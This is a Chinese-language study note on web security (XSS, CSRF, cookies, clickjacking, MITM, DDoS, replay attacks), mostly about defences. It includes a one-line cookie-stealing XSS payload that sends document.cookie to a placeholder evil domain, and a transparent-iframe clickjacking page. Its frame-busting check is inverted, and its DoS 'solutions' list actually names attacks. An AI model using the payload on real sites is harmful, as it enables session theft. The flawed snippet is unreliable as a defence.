# web 安全

[[toc]]

## XSS

### 什么是 XSS (跨站脚本攻击)

就是攻击者通过页面注入可执行的代码，例如评论的留言里。XSS 的类型分为两种：持久型和非持久型。

- 持久性：将攻击的代码通过服务端写入到数据库中，例如通过评论提交的评论里面是一段脚本，如果没做好防范就会提交到数据库里，可能导致其他用户会执行这段代码，会到攻击。
- 非持久性：一般是通过修改 URL 参数的方式加入攻击代码，从而诱导用户访问链接从而进行攻击。

### 如何防范 XSS

- 转义字符：将用户输入的内容，如引号、尖括号、斜杠进行转义；
- 采用白名单过滤标签和标签属性，例如过滤 script 标签；
- 使用 CSP 告诉浏览器限制外部资源可以加载和执行;
- 使用 HttpOnly 属性。很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。

开启 CSP 有两种方式：

1. 设置 HTTP-Header 中的 Content-sesurity-Policy。
2. 设置`<meta>`标签的方式`<meta http-equiv="Content-Security-Policy">`。

CSP 的功能：

- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；
- 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。

## CSRF

### 什么是 CSRF

中文的意思是跨站请求伪造。原理是攻击者构造出一个后端请求地址，诱导用户去点击发起请求。如果是登陆状态，服务端就会以为是用户在操作，从而进行相应的逻辑。

### 如何防范 CSRF

- 不让 get 请求对数据进行修改；
- 不让第三方网站访问到用户的 cookie，设置 cookie 的 SameSite 属性，不让 cookie 随跨域请求携带；
- 组织第三方网站请求接口，验证 Referer；
- Token 验证，登陆后服务器下发一个随机 token，之后的请求带上。

> SameSite 兼容性较差

### koa-csrf

koa-csrf 插件用来防止 CSRF 攻击。原理是在 session 之中写入一个秘密的 token，用户每次使用 POST 方法提交数据的时候，必须含有这个 token，否则就会抛出错误。

POST 请求含有 token，可以是以下几种方式之一，koa-csrf 插件就能获得 token。

- 表单的\_csrf 字段
- 查询字符串的\_csrf 字段
- HTTP 请求头信息的 x-csrf-token 字段
- HTTP 请求头信息的 x-xsrf-token 字段

## 前端 Cookies 问题

- 是一个前端的数据存贮；
- 前后端都可以设置；
- 遵循同源策略；

Secure 属性：指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。
HttpOnly 属性：指定该 Cookie 无法通过 JavaScript 脚本拿到

### Cookies 登录用户签名：

- 用户 ID，容易被篡改。
- 用户 ID + 签名，避免篡改 cookie
- sessionId。

每次登录生成随机的 sessionId，然后生成一个 session 对象，下面存放 userId 等用户信息。session 数据较多，不能放在内存中。如果放在内存，也会涉及服务器重启丢失的问题。一般将 session 放在缓存中。为了让登陆的用户同步，会将 session 放到外部存储机。

- token

### cookie 和 xss 的关系

cookie 容易被盗；

```js
new Image().src =
  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
```

防止：HttpOnly 设置为 true，但这个属性兼容性不太好。

### cookie 和 csrf 的关系

## 安全沙箱

将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。
安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击，
安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利
XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系的

## 点击劫持

### 什么是点击劫持

是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过 `iframe` 嵌入的方式嵌入到自己的网页里，将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

```html
<body style="background:url(clickhijack.png) no-repeat">
  <iframe
    style="opacity:.1"
    src="http://localhost:1521/post/1"
    width="800"
    height="600"
  >
  </iframe>
</body>
```

案例：

- 用游戏的方式打开了摄像头；
- 邮箱中，邮件的转发；

### 如何防范点击劫持

1. 现代浏览器设置 HTTP 响应头 X-FRAME-OPTIONS 为 DENY，这个响应头就是为了防御点击劫持的；兼容性比较好。ie8 以上都支持。

2. 判断 top.location === window.location 是否相同

   ```js
   if (top.location === window.location) {
     top.location = window.location;
   }
   ```

3. 远古浏览器使用 js 防御，当通过 iframe 的方式加载页面时，让攻击者网站不显示内容。

## 中间人攻击

### 什么是中间人攻击

就是在攻击者在服务端和客户端建立了连接，并让对方认为连接是安全的，攻击者不仅能获得双方的通信信息，还能修改通信信息。

### 如果防范中间人攻击

不要使用公共 wifi；只使用 https 协议，并关闭 http 的访问。

### 接口怎么防刷？

被人通过工具在短时间内恶意大量请求服务端。常用优化方式如下

- referer 校验 UA 校验
- 客户端和服务端约定签名算法，由服务端校验签名
- 服务端对请求 ip 单位时间内请求数量限制
- 通过前置交互式验证手段，先验证通过在接收请求

## 传输安全

### http 传输窃听篡改

- 在中间设备窃听数据
- 篡改数据，插入广告

使用命令行查看经过科哪些中间设备：

```js
// mac
traceroute https://juejin.im/timeline
// windows
tracert https://juejin.im/timeline
```

解决方法：

- https TLS(SSL) 加密

部署：

## 密码安全

### MD5

不可逆，简单密码可以通过查表得到；优于明文。

### SHA256

比特别就是用 SHA256 和非对称加密。

Hash 函数是这样，不论原始数据有多长、有多少位，经过 Hash 运算后，输出的值的长度都是固定的。

> node 中的加密模块：[crypto](http://nodejs.cn/api/crypto.html)

### 生物密码

- 缺少私密性，容易泄露；比如指纹，人脸。
- 生物特征没有对错，是一个概率的判断，不会百分之百可靠。相似性监测，没法做 hash 变换，只能留原始值。
- 唯一性，终生无法修改。

目前技术，还需要保持一个谨慎的态度。

## 其它安全问题

### DOS 拒绝服务攻击

- 模拟正常用户
- 大量占用服务资源
- 无法服务正常用户

常用解决方式：

- TCP 半连接
- 正常的 HTTP 连接
- 攻击 DNS,DNS 带宽叫小

### DDOS 大规模分布式拒绝服务攻击

- 流量可以达到几十到上百 G
- 分布式（肉鸡、代理）
- 极难防御。即便有方法防御，可能直接被运营商下线。

案例（非常多）：

- 如游戏；
- 2009 年 5 月 19，多个省断网；同时也导致了暴风影音疯狂请求解析，导致各地的 DNS 服务器瘫痪。
- [DDoS 攻击爆发！医疗在线教育成重点，代理攻击成常态](http://www.myzaker.com/article/5e7ede008e9f09031e1c712e/);

常用解决方式：

- 防火墙
- 专业交换机和路由器
- 流量清洗
- 高防 IP

开发层面的防止：

- 避免重逻辑业务；
- 快速失败，快速返回。防止任务过度重试
- 防雪崩的机制。给系统设置请求上线。给别的请求返回失败。
- 有损服务
- CDN,对动态任务的请求，不是很理想

### 重放攻击

- 重复提交；
- 常见于支付，抽奖，刷票等

常用解决方式：

- 加密；
- 加时间戳；
- 加 token，token 只能使用一次。
- onnce
- 以上标识为了防篡改，需要做签名
